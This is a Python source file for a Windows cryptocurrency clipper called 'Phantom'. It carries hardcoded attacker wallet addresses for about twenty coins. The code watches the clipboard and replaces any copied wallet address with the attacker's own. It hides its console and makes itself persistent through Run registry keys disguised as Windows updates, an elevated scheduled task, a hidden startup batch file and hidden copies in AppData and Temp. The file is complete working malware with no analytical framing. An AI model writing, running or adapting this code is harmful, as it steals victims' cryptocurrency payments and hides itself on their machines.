#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# phantom_crypto.py - PHANTOM APOCALYPSE CRYPTO CLIPPER

import os
import sys
import ctypes
import threading
import time
import re
import hashlib
import base64
import subprocess
import winreg
import random
import string
import shutil

# =================== ТВОИ КОШЕЛЬКИ ===================

WALLETS = {
    'btc': 'bc1q6rl9yt6sphu35r2hnjl9hwyuzunymt62zjh0jl',
    'eth': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',
    'xrp': 'rnXaahAyXUL84G3FJZQqeGsuWH1aPDppdY',
    'trx': 'TGWJae3A6coKoJ7mfEL2zoJmEtNZrtMFef',
    'ton': 'UQB5fCRohpbbAKd-zSmbKcuLXKlyHaoRPLvDVhWJNAbXAg4A',
    'ltc': 'ltc1qv9zzt6u3u3ujxl4fh5gedfhe3m4d2xqmh95fv3',
    'usdt_erc': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',
    'sol': 'AqUuX2ozrWqDEAmotVaqkyDtTNEt3DwmsEL6xBPzbTjz',
    'doge': 'DBrR4MYkFawin6JgQ5rVRLGYMSYxXnsZkE',
    'bch': 'qrln7fac422h8jvq9lahdsc439p595rx0uj48e6g0l',
    'xlm': 'GBZXAPJDDYXUTRMXUX7KJZIK3ERFHCMUC3TBXH4A2OVQMY37DNB4M7HS',
    'ada': 'addr1qyu6jfljltj75ha0r0pp2t3ax2ljuv50m9e4k08wgeqme20tkwwg2cl3wzpdp9ewfmlgaj9gj9delqe54lcjn84pjgcqay3ajt',
    'polygon': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',
    'dot': '1QFDFxZUUoqQe168rnf8idrKB1sVGBLuQoUFWxBwsQrsuyH',
    'dash': 'XjjLykfR1EDojRTNnt3VSPjuqatdeQy2nA',
    'bnb': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',
    'xtz': 'tz1SZs2awPWaEeBjB2Lf8EgSfATWtjjbNuSa',
    'zec': 't1XheRP6Gn6BLrcCDbtFJn94iGAdTLFAGCj',
    'usdt_trc': 'TGWJae3A6coKoJ7mfEL2zoJmEtNZrtMFef'
}

# =================== ПАТТЕРНЫ ДЕТЕКЦИИ ===================

PATTERNS = {
    'btc': [
        r'^1[1-9A-HJ-NP-Za-km-z]{25,34}$',
        r'^3[1-9A-HJ-NP-Za-km-z]{25,34}$',
        r'^bc1[ac-hj-np-z02-9]{11,71}$'
    ],
    'eth': [r'^0x[a-fA-F0-9]{40}$'],
    'xrp': [r'^r[1-9A-HJ-NP-Za-km-z]{25,34}$'],
    'trx': [r'^T[A-Za-z1-9]{33}$'],
    'ton': [r'^UQ[A-Za-z0-9_-]{48}$', r'^EQ[A-Za-z0-9_-]{48}$'],
    'ltc': [
        r'^L[1-9A-HJ-NP-Za-km-z]{25,34}$',
        r'^ltc1[ac-hj-np-z02-9]{11,71}$'
    ],
    'usdt_erc': [r'^0x[a-fA-F0-9]{40}$'],
    'sol': [r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'],
    'doge': [r'^D[1-9A-HJ-NP-Za-km-z]{25,34}$'],
    'bch': [r'^q[a-zA-Z0-9]{41}$', r'^1[1-9A-HJ-NP-Za-km-z]{25,34}$'],
    'xlm': [r'^G[A-Z0-9]{55}$'],
    'ada': [r'^addr1[a-z0-9]{58,98}$'],
    'polygon': [r'^0x[a-fA-F0-9]{40}$'],
    'dot': [r'^1[1-9A-HJ-NP-Za-km-z]{46,48}$'],
    'dash': [r'^X[1-9A-HJ-NP-Za-km-z]{25,34}$'],
    'bnb': [r'^0x[a-fA-F0-9]{40}$'],
    'xtz': [r'^tz[1-3][A-Za-z0-9]{33}$'],
    'zec': [r'^t[1-3][A-Za-z0-9]{33}$'],
    'usdt_trc': [r'^T[A-Za-z1-9]{33}$']
}

# =================== CRYPTO CLIPPER CLASS ===================

class PhantomCryptoClipper:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
        self.stats = {'replaced': 0, 'networks': {}, 'start_time': time.time()}
        
    def replace_crypto_addresses(self, content):
        original_content = content
        replaced_any = False
        
        for network, patterns in PATTERNS.items():
            for pattern in patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if match != WALLETS.get(network, ''):
                        content = content.replace(match, WALLETS[network])
                        self.stats['replaced'] += 1
                        if network not in self.stats['networks']:
                            self.stats['networks'][network] = 0
                        self.stats['networks'][network] += 1
                        replaced_any = True
        
        return content, replaced_any
    
    def monitor_clipboard(self):
        last_clipboard = ""
        
        while True:
            try:
                if self.user32.OpenClipboard(0):
                    handle = self.user32.GetClipboardData(1)
                    
                    if handle:
                        data = ctypes.c_char_p(handle).value
                        
                        if data and data != last_clipboard:
                            content = data.decode('utf-8', errors='ignore')
                            new_content, replaced = self.replace_crypto_addresses(content)
                            
                            if replaced:
                                self.user32.EmptyClipboard()
                                new_data = new_content.encode('utf-8')
                                h_mem = self.kernel32.GlobalAlloc(0x0042, len(new_data) + 1)
                                if h_mem:
                                    p_mem = self.kernel32.GlobalLock(h_mem)
                                    if p_mem:
                                        ctypes.memmove(p_mem, new_data, len(new_data))
                                        self.kernel32.GlobalUnlock(h_mem)
                                        self.user32.SetClipboardData(1, h_mem)
                            
                            last_clipboard = data
                    
                    self.user32.CloseClipboard()
                    
            except:
                pass
                
            time.sleep(0.1)

# =================== PERSISTENCE FUNCTIONS ===================

def get_script_path():
    if getattr(sys, 'frozen', False):
        return sys.executable
    else:
        return os.path.abspath(__file__)

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def setup_registry_persistence():
    try:
        script_path = get_script_path()
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, 
                         f'pythonw.exe "{script_path}"')
        winreg.CloseKey(key)
    except:
        pass

def setup_registry_admin():
    if not check_admin():
        return
    try:
        script_path = get_script_path()
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "SystemMaintenance", 0, winreg.REG_SZ,
                         f'pythonw.exe "{script_path}"')
        winreg.CloseKey(key)
    except:
        pass

def create_scheduled_task():
    try:
        script_path = get_script_path()
        cmd = f'schtasks /create /tn "WindowsSecurityUpdate" /tr "pythonw.exe \\"{script_path}\\"" /sc onlogon /f /rl highest'
        subprocess.run(cmd, shell=True, capture_output=True)
    except:
        pass

def create_startup_shortcut():
    try:
        script_path = get_script_path()
        startup_folder = os.path.join(
            os.environ['APPDATA'],
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        
        if os.path.exists(startup_folder):
            # Create batch file for startup
            batch_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
            with open(batch_path, 'w') as f:
                f.write(f'@echo off\nstart /min pythonw.exe "{script_path}"')
            
            # Hide the batch file
            try:
                ctypes.windll.kernel32.SetFileAttributesW(batch_path, 2)
            except:
                pass
    except:
        pass

def copy_to_hidden_locations():
    try:
        script_path = get_script_path()
        
        locations = [
            os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows'),
            os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft'),
            os.path.join(os.environ['TEMP'])
        ]
        
        for location in locations:
            try:
                if os.path.exists(location):
                    random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                    dest_path = os.path.join(location, f'{random_name}.pyw')
                    shutil.copy2(script_path, dest_path)
                    ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2)
            except:
                pass
    except:
        pass

def setup_maximum_persistence():
    setup_registry_persistence()
    setup_registry_admin()
    create_scheduled_task()
    create_startup_shortcut()
    copy_to_hidden_locations()

# =================== MAIN ===================

def main():
    hide_console()
    setup_maximum_persistence()
    
    clipper = PhantomCryptoClipper()
    
    try:
        clipper.monitor_clipboard()
    except KeyboardInterrupt:
        pass
    except:
        pass

if __name__ == "__main__":
    main()
